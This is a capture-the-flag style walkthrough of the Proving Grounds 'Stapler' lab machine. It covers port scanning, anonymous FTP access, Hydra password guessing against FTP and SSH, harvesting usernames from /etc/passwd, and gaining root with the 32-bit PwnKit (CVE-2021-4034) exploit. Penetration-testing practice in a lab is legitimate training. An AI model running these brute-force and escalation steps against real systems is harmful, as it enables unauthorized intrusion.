Running our autonmap script, we see FTP has login with FTP username

```
Running all scans on 192.168.217.148

No ping detected.. Will not use ping scans!

Host is likely running Unknown OS!

---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
139/tcp  open  netbios-ssn
666/tcp  open  doom
3306/tcp open  mysql

---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE        VERSION
21/tcp   open  ftp            vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh            OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp   open  tcpwrapped
80/tcp   open  http           PHP cli server 5.5 or later
|_http-title: 404 Not Found
3306/tcp open  mysql          MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 10
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolNew, SupportsLoadDataLocal, Speaks41ProtocolOld, Support41Auth, FoundRows, InteractiveClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongPassword, ConnectWithDatabase, LongColumnFlag, SupportsTransactions, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: @"PL~g\x086\x12z4+{VC\x15u\x03f\x14
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2024-02-26T04:56:31+00:00
| smb2-time: 
|   date: 2024-02-26T04:56:31
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Login to FTP with Filezilla
![[Pasted image 20240226104508.png]]

It has one file
![[Pasted image 20240226104539.png]]

Grab this and let's see what it says
![[Pasted image 20240226104627.png]]

Throw those into a list
```
┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Stapler]
└─$ echo 'elly' > ftp_users                                    
                                                                                                                       
┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Stapler]
└─$ echo 'john' >> ftp_users
                                                                                                                       
┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Stapler]
└─$ cat ftp_users                      
elly
john
```

Use Hydra to check if it's brute forceable - use the -e nsr (-e nsr    try "n" null password, "s" login as pass and/or "r" reversed login)
```
└─$ hydra -L ftp_users -e nsr ftp://192.168.250.148
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-26 10:48:35
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:2/p:3), ~1 try per task
[DATA] attacking ftp://192.168.250.148:21/
[21][ftp] host: 192.168.250.148   login: elly   password: ylle
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-26 10:48:39
```

Login to the FTP again with elly
![[Pasted image 20240226105001.png]]

Download the /etc/passwd file
Separate the names
```
└─$ cat names 
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-timesync
systemd-network
systemd-resolve
systemd-bus-proxy
syslog
_apt
lxd
dnsmasq
messagebus
sshd
peter
mysql
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
postfix
ftp
elly
```

Try what we did again with Hydra
`hydra -L names -e nsr ssh://192.168.217.148 

We get a hit
`[22][ssh] host: 192.168.250.148   login: SHayslett   password: SHayslett`

Transfer lse_cve.sh over and run it

We see it's vulnerable to PwnKit
`[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!`

Get an error when trying to run PwnKit
`SHayslett@red:/tmp/PwnKit-main$ chmod +x PwnKit.sh`
`SHayslett@red:/tmp/PwnKit-main$ ./PwnKit.sh`
`./PwnKit.sh: line 4: ./PwnKit: cannot execute binary file: Exec format error`

`SHayslett@red:/tmp/PwnKit-main$ uname -m`
`i686`

It's only 32 bit so we need the 32 bit PwnKit
`SHayslett@red:/tmp$ unzip PwnKit-main.zip`
`Archive:  PwnKit-main.zip`
`1923ad7b438ae82eaa2162e15a1e1b810712e54e`
   `creating: PwnKit-main/`
  `inflating: PwnKit-main/LICENSE`     
  `inflating: PwnKit-main/Makefile`    
  `inflating: PwnKit-main/PwnKit`      
  `inflating: PwnKit-main/PwnKit.c`    
  `inflating: PwnKit-main/PwnKit.sh`   
  `inflating: PwnKit-main/PwnKit32`    
  `inflating: PwnKit-main/README.md`   
   `creating: PwnKit-main/imgs/`
  `inflating: PwnKit-main/imgs/exploit.png`  
  `inflating: PwnKit-main/imgs/oneliner.png`  
  `inflating: PwnKit-main/imgs/patched.png`

Running the 32 bit PwnKit we get root
`SHayslett@red:/tmp/PwnKit-main$ ./PwnKit32`
`root@red:/tmp/PwnKit-main#` 

Grab the flags
`root@red:/tmp/PwnKit-main# cat /root/proof.txt`
`1a3a2de791ed4ec4425a48232abbf075`
`root@red:/tmp/PwnKit-main# find / -name local.txt 2>/dev/null`
`/home/local.txt`
`root@red:/tmp/PwnKit-main# cat /home/local.txt`
`0fffda1c8b824001ad851dcb365d4c77`
